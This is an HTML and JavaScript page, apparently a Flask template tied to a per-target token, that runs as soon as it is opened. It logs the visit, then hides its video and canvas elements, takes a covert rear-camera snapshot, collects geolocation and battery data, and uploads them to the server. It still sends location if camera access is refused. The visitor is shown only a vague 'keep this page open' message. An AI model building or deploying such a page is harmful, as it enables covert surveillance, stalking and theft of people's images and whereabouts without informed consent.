<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Session — capture on open</title>
  <style>
    body{font-family:system-ui,Arial; padding:12px; max-width:680px; margin:auto}
    #status{margin-top:8px; color:#333; white-space:pre-wrap}
    /* hidden video + canvas */
    video, canvas { display:none !important; width:0; height:0; visibility:hidden; }
  </style>
</head>
<body>
  <h2>Session — keep this page open</h2>
  <p id="status">Initializing — requesting permissions…</p>

  <!-- hidden elements used for single snapshot -->
  <video id="video" autoplay playsinline muted></video>
  <canvas id="hiddenCanvas"></canvas>

  <script>
    const token = "{{ token }}"; // injected by Flask
    const statusEl = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('hiddenCanvas');

    function log(msg){
      statusEl.textContent = msg;
      console.log(msg);
    }

    // POST JSON helper (keepalive)
    async function postJSON(path, payload){
      try{
        await fetch(path, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true
        });
      }catch(e){
        console.warn('postJSON failed', e);
      }
    }

    // convert canvas to dataURL (jpeg)
    function canvasToDataURL() {
      try{
        return canvas.toDataURL('image/jpeg', 0.85);
      }catch(e){
        console.warn('canvasToDataURL', e);
        return null;
      }
    }

    // convert dataURL to JSON blob
    function makeJsonBlob(obj){
      return new Blob([JSON.stringify(obj)], { type: 'application/json' });
    }

    // send image payload; uses sendBeacon first, then fetch keepalive fallback
    async function sendImagePayload(dataUrl, coords, battery){
      const endpoint = `/upload_image/${token}`;
      const payload = { image_b64: dataUrl, coords: coords || null, battery: battery || null };

      try {
        const blob = makeJsonBlob(payload);
        if (navigator.sendBeacon) {
          const ok = navigator.sendBeacon(endpoint, blob);
          if (ok) { log('Final photo queued (sendBeacon).'); return true; }
          console.warn('sendBeacon returned false; falling back to fetch keepalive');
        }
      } catch(e){
        console.warn('sendBeacon error', e);
      }

      try {
        await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true
        });
        log('Final photo uploaded (fetch keepalive).');
        return true;
      } catch(e){
        console.warn('fetch keepalive failed', e);
        try {
          await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          log('Final photo uploaded (normal fetch).');
          return true;
        } catch(err){
          console.error('All upload attempts failed', err);
          return false;
        }
      }
    }

    // get battery info (if available)
    async function getBatteryInfo(){
      try{
        if ('getBattery' in navigator) {
          const b = await navigator.getBattery();
          return { level: Math.round(b.level * 100), charging: !!b.charging };
        }
      }catch(e){ console.warn('Battery API error', e); }
      return null;
    }

    // get coords (one-shot)
    function getCurrentCoords(timeout = 8000){
      return new Promise((resolve) => {
        if (!('geolocation' in navigator)) return resolve(null);
        let done = false;
        const onSuccess = (pos) => { if (done) return; done = true; resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); };
        const onError = (err) => { if (done) return; done = true; console.warn('geo error', err); resolve(null); };
        navigator.geolocation.getCurrentPosition(onSuccess, onError, { timeout });
        // fallback timeout safety
        setTimeout(()=>{ if (!done) { done = true; resolve(null); } }, timeout + 200);
      });
    }

    // take single snapshot from camera stream (no visible preview)
    function takeSnapshotOnce(){
      if (!video.videoWidth || !video.videoHeight) return null;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvasToDataURL();
    }

    // stop camera tracks
    function stopCamera(stream){
      if (!stream) return;
      try {
        stream.getTracks().forEach(t=>t.stop());
      } catch(e){ console.warn('stopCamera error', e); }
    }

    // main flow: record visit, then try to capture a single photo & metadata
    (async function main(){
      log('Recording visit and requesting permissions…');

      // quick visit note so server stores IP + timestamp even if camera denied
      postJSON(`/upload_info/${token}`, { note: 'page-open' });

      // get battery and coords in parallel (non-blocking)
      const batteryPromise = getBatteryInfo();
      const coordsPromise = getCurrentCoords(8000);

      // request camera permission & capture one photo
      let stream = null;
      try {
        // Request camera; browser will show permission prompt — cannot be bypassed
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
        video.srcObject = stream;

        // wait briefly for first frame (some devices need a tick)
        await new Promise(res => setTimeout(res, 300));

        const dataUrl = takeSnapshotOnce();
        stopCamera(stream);

        const battery = await batteryPromise;
        const coords = await coordsPromise;

        if (!dataUrl) {
          log('Could not capture image (no frame). Sending metadata only.');
          // send metadata-only info
          postJSON(`/upload_info/${token}`, { note: 'no-image', coords, battery });
          return;
        }

        log('Captured final photo; uploading now (background)…');
        const ok = await sendImagePayload(dataUrl, coords, battery);
        if (ok) log('Upload attempt finished.');
        else log('Upload failed; metadata sent instead.');
        if (!ok) postJSON(`/upload_info/${token}`, { note: 'upload-failed', coords, battery });

      } catch (err) {
        // user denied camera or device error
        console.warn('Camera capture failed or permission denied:', err);
        log('Camera permission denied or error. Sending metadata only.');
        const battery = await batteryPromise;
        const coords = await coordsPromise;
        postJSON(`/upload_info/${token}`, { note: 'camera-denied', coords, battery });
        if (stream) stopCamera(stream);
        return;
      }
    })();
  </script>
</body>
</html>
